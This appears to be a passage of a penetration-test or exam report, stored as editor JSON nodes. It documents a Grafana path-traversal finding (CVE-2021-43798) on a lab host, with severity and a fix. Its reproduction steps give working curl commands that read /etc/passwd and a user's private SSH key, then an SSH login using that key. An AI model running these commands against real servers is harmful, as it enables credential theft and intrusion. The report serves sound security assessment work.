{"type":"codeBlock","attrs":{"language":"","source":"entry:l-exam-web01-nmap:0:output","gen":"b3284480"},"content":[{"type":"text","text":"22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)\\n80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))\\n3000/tcp open  ppp?"}]}
{"type":"heading","attrs":{"level":2,"source":"phase:h-exam-web:foothold:f-exam-grafana","gen":"ea0f8ae6"},"content":[{"type":"text","text":"Initial access: Unauthenticated path traversal in Grafana 8.3.0 (CVE-2021-43798)"}]}
{"type":"paragraph","content":[{"type":"text","text":"Vulnerability explanation:","marks":[{"type":"bold"}]},{"type":"text","text":" The plugin asset route of Grafana 8.0.0 to 8.3.0 does not normalise the path, so any file the grafana user can read is served without logging in. dev's private SSH key was readable."}],"attrs":{"source":"finding:f-exam-grafana:explanation","gen":"8eaa283e"}}
{"type":"paragraph","content":[{"type":"text","text":"Vulnerability fix:","marks":[{"type":"bold"}]},{"type":"text","text":" Upgrade Grafana to 8.3.1 or later. Keep SSH private keys readable by their owner only."}],"attrs":{"source":"finding:f-exam-grafana:fix","gen":"ccc3d12d"}}
{"type":"paragraph","attrs":{"source":"finding:f-exam-grafana:severity","gen":"8372158f"},"content":[{"type":"text","text":"Severity:","marks":[{"type":"bold"}]},{"type":"text","text":" High"}]}
{"type":"paragraph","attrs":{"source":"phase-steps:h-exam-web","gen":"8ec36930"},"content":[{"type":"text","text":"Steps to reproduce:","marks":[{"type":"bold"}]}]}
{"type":"list","attrs":{"kind":"ordered"},"content":[{"type":"paragraph","attrs":{"source":"entry:l-exam-web01-passwd:title","gen":"700413fc"},"content":[{"type":"text","text":"Path traversal reads /etc/passwd on web01:"}]},{"type":"codeBlock","attrs":{"language":"","source":"entry:l-exam-web01-passwd:0:command","gen":"45393a7b"},"content":[{"type":"text","text":"curl --path-as-is http://10.10.30.20:3000/public/plugins/alertlist/../../../../../../../../etc/passwd"}]},{"type":"codeBlock","attrs":{"language":"","source":"entry:l-exam-web01-passwd:0:output","gen":"7842b35d"},"content":[{"type":"text","text":"root:x:0:0:root:/root:/bin/bash\\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\\nsshd:x:110:65534::/run/sshd:/usr/sbin/nologin\\ndev:x:1000:1000:dev,,,:/home/dev:/bin/bash\\ngrafana:x:113:118::/usr/share/grafana:/bin/false"}]}]}
{"type":"list","attrs":{"kind":"ordered"},"content":[{"type":"paragraph","attrs":{"source":"entry:l-exam-web01-key:title","gen":"e5f1e5f2"},"content":[{"type":"text","text":"Path traversal reads dev's SSH key:"}]},{"type":"codeBlock","attrs":{"language":"","source":"entry:l-exam-web01-key:0:command","gen":"86db1ba7"},"content":[{"type":"text","text":"curl -s --path-as-is http://10.10.30.20:3000/public/plugins/alertlist/../../../../../../../../home/dev/.ssh/id_rsa -o dev_id_rsa && head -3 dev_id_rsa"}]},{"type":"codeBlock","attrs":{"language":"","source":"entry:l-exam-web01-key:0:output","gen":"0dacc095"},"content":[{"type":"text","text":"-----BEGIN OPENSSH PRIVATE KEY-----\\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn\\nNhAAAAAwEAAQAAAYEAs2N0aGV0aWMta2V5LWZvci1hbi1hdWRpdC1maXh0dXJlLW9ubHkA"}]}]}
{"type":"list","attrs":{"kind":"ordered"},"content":[{"type":"paragraph","attrs":{"source":"entry:l-exam-web01-ssh:title","gen":"f06e0f2b"},"content":[{"type":"text","text":"SSH to web01 as dev with the key:"}]},{"type":"codeBlock","attrs":{"language":"","source":"entry:l-exam-web01-ssh:0:command","gen":"a7a0f8d3"},"content":[{"type":"text","text":"chmod 600 dev_id_rsa && ssh -i dev_id_rsa dev@10.10.30.20"}]},{"type":"codeBlock","attrs":{"language":"","source":"entry:l-exam-web01-ssh:0:output","gen":"58e60a13"},"content":[{"type":"text","text":"Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-196-generic x86_64)\\n\\nLast login: Tue Nov  3 09:14:52 2026 from 10.10.30.254\\ndev@web01:~$ id\\nuid=1000(dev) gid=1000(dev) groups=1000(dev)"}]}]}
